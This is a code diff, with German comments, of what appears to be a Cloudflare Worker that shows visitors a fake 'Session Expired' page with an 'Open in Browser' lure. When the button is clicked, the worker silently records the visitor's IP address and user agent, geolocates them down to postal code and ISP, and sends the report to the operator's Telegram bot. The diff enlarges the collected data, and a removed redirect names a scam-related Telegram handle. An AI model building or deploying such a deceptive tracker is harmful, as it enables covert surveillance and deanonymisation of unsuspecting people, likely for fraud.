@@ -27,7 +27,7 @@ export default {
               <h1>Session Expired</h1>
               <p>This session is not supported. Please open in a secure browser to continue.</p>
               
-              <!-- KEIN PIXEL MEHR HIER! Der Klick auf den Button logged die IP. -->
+              <!-- Der Button führt jetzt auf eine saubere /go Route -->
               <a href="/go?c=${tag}" class="btn">Open in Browser</a>
           </div>
       </body>
@@ -36,36 +36,50 @@ export default {
       return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
     }
 
-    // --- TEIL 2: DER LOGGER & REDIRECT (Wird beim Button-Klick ausgelöst) ---
+    // --- TEIL 2: DER LOGGER & REDIRECT ---
     if (url.pathname === "/go") {
       const ip = request.headers.get("CF-Connecting-IP") || "unknown";
       const ua = request.headers.get("User-Agent") || "unknown";
       const tag = url.searchParams.get("c") || "unbekannt";
       const t = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });
 
-      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt", timezone = "Unbekannt";
-      
+      // Alle Variablen vorbereiten
+      let ipVersion = "Unbekannt";
+      let loc = "Unbekannt";
+      let isp = "Unbekannt";
+      let asn = "Unbekannt";
+      let postal = "Unbekannt";
+      let continent = "Unbekannt";
+
       try {
-        const res = await fetch(`https://ipwho.is/${ip}`);
+        // Detaillierte API-Abfrage
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp,org,as,continent,query`);
         const data = await res.json();
-        if (data.success) {
-          loc = `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`;
-          isp = data.connection?.isp || "?";
-          asn = `AS${data.connection?.asn || '?'} (${data.connection?.org || '?'})`;
-          timezone = data.timezone?.id || "?";
+        
+        if (data.status === "success") {
+          // Prüfen, ob es IPv4 oder IPv6 ist
+          ipVersion = ip.includes(':') ? "IPv6" : "IPv4";
+          
+          loc = `${data.zip || '?'} ${data.city || '?'}, ${data.regionName || '?'}, ${data.country || '?'}`;
+          isp = data.isp || "?";
+          asn = `${data.as || '?'} (${data.org || '?'})`;
+          continent = data.continent || "?";
         }
       } catch (e) {}
 
       if (env.BOT_TOKEN && env.CHAT_ID) {
+        // Formatierter, tödlicher Report für deinen Bot
         const msg = 
           `[${tag}]\n` +
-          `IP: ${ip}\n` +
+          `------------------------\n` +
+          `IP: ${ip} (${ipVersion})\n` +
           `Ort: ${loc}\n` +
-          `ISP: ${isp}\n` +
-          `ASN: ${asn}\n` +
-          `Timezone: ${timezone}\n` +
+          `Kontinent: ${continent}\n` +
+          `Provider: ${isp}\n` +
+          `ASN/Org: ${asn}\n` +
           `Zeit: ${t}\n` +
-          `Device: ${ua.slice(0, 60)}...`;
+          `------------------------\n` +
+          `Device: ${ua}`;
 
         try {
           await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
@@ -76,9 +90,12 @@ export default {
         } catch (e) {}
       }
 
-      // NACH DEM LOGGEN: Weiterleitung zu deinem Telegram-Profil
-      // TRAGE HIER DEINEN TELEGRAM NAMEN EIN (ohne @)
-      return Response.redirect("https://t.me/enkeltrickbetrger", 302);
+      // Um sicherzugehen, dass Telegram die Nachricht sendet, 
+      // warten wir 200 Millisekunden, BEVOR wir weiterleiten.
+      await new Promise(r => setTimeout(r, 200));
+
+      // Weiterleitung zu deinem Profil
+      return Response.redirect("https://t.me/dein_telegram_username", 302);
     }
 
     return new Response("404 Not Found", { status: 404 });
